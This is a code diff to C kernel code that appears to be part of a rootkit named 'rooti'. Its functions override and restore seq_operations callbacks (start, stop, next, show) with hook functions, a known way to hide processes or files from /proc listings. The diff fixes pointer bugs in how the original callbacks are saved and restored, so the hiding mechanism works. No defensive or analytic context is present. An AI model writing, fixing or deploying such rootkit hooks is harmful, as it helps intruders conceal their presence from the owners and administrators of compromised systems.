@@ -15,15 +15,15 @@ static int rooti_override_seq_ops(struct seq_operations *seq_ops, struct rooti_s
             seq_ops->start = hook->func;
             break;
         case ROOTI_SEQ_STOP:
-            *(unsigned long *)hook->orig = (unsigned long)seq_ops->stop;
+            *((unsigned long *)hook->orig) = (unsigned long)seq_ops->stop;
             seq_ops->stop = hook->func;
             break;
         case ROOTI_SEQ_NEXT:
-            *(unsigned long *)hook->orig = (unsigned long)seq_ops->next;
+            *((unsigned long *)hook->orig) = (unsigned long)seq_ops->next;
             seq_ops->next = hook->func;
             break;
         case ROOTI_SEQ_SHOW:
-            *(unsigned long *)hook->orig = (unsigned long)seq_ops->show;
+            *((unsigned long *)hook->orig) = (unsigned long)seq_ops->show;
             seq_ops->show = hook->func;
             break;
         default:
@@ -40,16 +40,16 @@ static int rooti_restore_seq_ops(struct seq_operations *seq_ops, struct rooti_se
 {
     switch (hook->op) {
         case ROOTI_SEQ_START:
-            *(unsigned long *)seq_ops->start = (unsigned long)hook->orig;
+            *((unsigned long *)&seq_ops->start) = *((unsigned long *)hook->orig);
             break;
         case ROOTI_SEQ_STOP:
-            *(unsigned long *)seq_ops->stop = (unsigned long)hook->orig;
+            *((unsigned long *)&seq_ops->stop) = *((unsigned long *)hook->orig);
             break;
         case ROOTI_SEQ_NEXT:
-            *(unsigned long *)seq_ops->next = (unsigned long)hook->orig;
+            *((unsigned long *)&seq_ops->next) = *((unsigned long *)hook->orig);
             break;
         case ROOTI_SEQ_SHOW:
-            *(unsigned long *)seq_ops->show = (unsigned long)hook->orig;
+            *((unsigned long *)&seq_ops->show) = *((unsigned long *)hook->orig);
             break;
         default:
             return -EINVAL;
